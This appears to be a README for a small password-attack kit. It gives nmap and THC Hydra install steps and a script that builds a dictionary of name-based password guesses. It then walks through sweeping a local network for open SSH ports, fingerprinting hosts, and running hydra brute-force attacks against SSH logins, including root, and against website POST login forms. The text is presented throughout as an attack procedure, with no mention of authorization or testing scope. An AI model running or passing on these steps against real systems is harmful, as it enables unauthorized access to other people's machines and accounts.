Tools Required:
    OS: Ubuntu
    Environment: Python, nmap, THC Hydra
    Nmap install:
        $ sudo apt-get install nmap
    Hydra install:
        $ sudo -E add-apt-repository ppa:pi-rho/security
        $ sudo apt-get update
        $ sudo apt-get install hydra
Generate Password
-----------------------------------------------------------
python password.py user1 user2  // generate pass.txt

gives common password used by maximum people
e.g john doe (generate 336 possibilities)
john1
john2
john!
John@
Djohn!@
johnD3
..
...
....
for more see pass.txt

-----------------------------------------------------------
After Generating Dictionary Password, Start Password Attack
-----------------------------------------------------------
for SSH attack
-----------------------------------------------------------
Scan Entire Network for 22 port
    $ ifconfig
        it gives you IPv4 address e.g 172.30.102.xxx
    $ nmap -p 22 172.30.102.0/24
        it will give all ip's active within the network for ssh
Select a Particular IPv4 address
    $ nmap -A -T4 IPv4_Address
        it may give you pc name if you don't know pc name or user
        if you user username and pc name then skip this step
Attack
    $ hydra -s 22 -v -l (root or username) -P pass.txt -t 4 IPv4_address ssh
-------------------------------------------------------------
Http-Form Attacks
-------------------------------------------------------------
Find Login Post url of a website...
e.g <form action="/auth/login.php" method="post">
then base_url is website_url and login_url is '/auth/login.php'
if action="" or not defined then login_url is the page_url itself
e.g you are at www.example.com/auth/login and form action in none
then base_url is www.example.com and login_url is /auth/login
Now Attack----
    $ hydra -l username -P pass.txt (www.example.com or IPv4) -t 4 -V http-post-form "login_url:username=^USER^&password=^PASS^:S=success"